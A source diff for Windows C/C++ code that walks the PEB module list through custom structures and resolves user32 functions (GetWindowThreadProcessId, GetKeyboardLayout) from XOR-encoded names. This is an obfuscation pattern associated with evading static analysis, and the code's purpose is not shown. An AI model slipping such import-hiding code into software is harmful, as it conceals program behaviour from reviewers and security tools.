@@ -50,16 +50,50 @@ static inline void c2t_xor_decode(char *dest, const unsigned char *src, size_t l
     dest[len] = '\0';
 }
 
-#include <winternl.h>
+typedef struct _C2T_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} C2T_UNICODE_STRING;
+
+typedef struct _C2T_LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    C2T_UNICODE_STRING FullDllName;
+    C2T_UNICODE_STRING BaseDllName;
+} C2T_LDR_DATA_TABLE_ENTRY;
+
+typedef struct _C2T_PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+} C2T_PEB_LDR_DATA;
+
+typedef struct _C2T_PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    BOOLEAN BitField;
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    C2T_PEB_LDR_DATA *Ldr;
+} C2T_PEB;
 
 static HMODULE c2t_get_module_handle_peb(const wchar_t *module_name)
 {
 #if defined(_WIN64)
-    PPEB peb = (PPEB)__readgsqword(0x60);
+    C2T_PEB *peb = (C2T_PEB*)__readgsqword(0x60);
 #elif defined(_WIN32)
-    PPEB peb = (PPEB)__readfsdword(0x30);
+    C2T_PEB *peb = (C2T_PEB*)__readfsdword(0x30);
 #else
-    PPEB peb = nullptr;
+    C2T_PEB *peb = nullptr;
 #endif
     if (!peb || !peb->Ldr) return nullptr;
 
@@ -67,7 +101,7 @@ static HMODULE c2t_get_module_handle_peb(const wchar_t *module_name)
     PLIST_ENTRY curr = head->Flink;
 
     while (curr && curr != head) {
-        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
+        C2T_LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(curr, C2T_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
         if (entry->BaseDllName.Buffer) {
             if (_wcsicmp(entry->BaseDllName.Buffer, module_name) == 0) {
                 return (HMODULE)entry->DllBase;
@@ -90,7 +124,10 @@ static DWORD c2t_GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId)
         c2t_xor_decode(fn_buf, enc_fn, sizeof(enc_fn), 0x5A);
         HMODULE hUser32 = c2t_get_module_handle_peb(L"user32.dll");
         if (!hUser32) hUser32 = GetModuleHandleA(u32_buf);
-        if (hUser32) p_func = (pfn_GetWindowThreadProcessId)(void*)GetProcAddress(hUser32, fn_buf);
+        if (hUser32) {
+            FARPROC proc = GetProcAddress(hUser32, fn_buf);
+            memcpy(&p_func, &proc, sizeof(p_func));
+        }
     }
     if (p_func) return p_func(hWnd, lpdwProcessId);
     return 0;
@@ -108,7 +145,10 @@ static HKL c2t_GetKeyboardLayout(DWORD idThread)
         c2t_xor_decode(fn_buf, enc_fn, sizeof(enc_fn), 0x5A);
         HMODULE hUser32 = c2t_get_module_handle_peb(L"user32.dll");
         if (!hUser32) hUser32 = GetModuleHandleA(u32_buf);
-        if (hUser32) p_func = (pfn_GetKeyboardLayout)(void*)GetProcAddress(hUser32, fn_buf);
+        if (hUser32) {
+            FARPROC proc = GetProcAddress(hUser32, fn_buf);
+            memcpy(&p_func, &proc, sizeof(p_func));
+        }
     }
     if (p_func) return p_func(idThread);
     return nullptr;
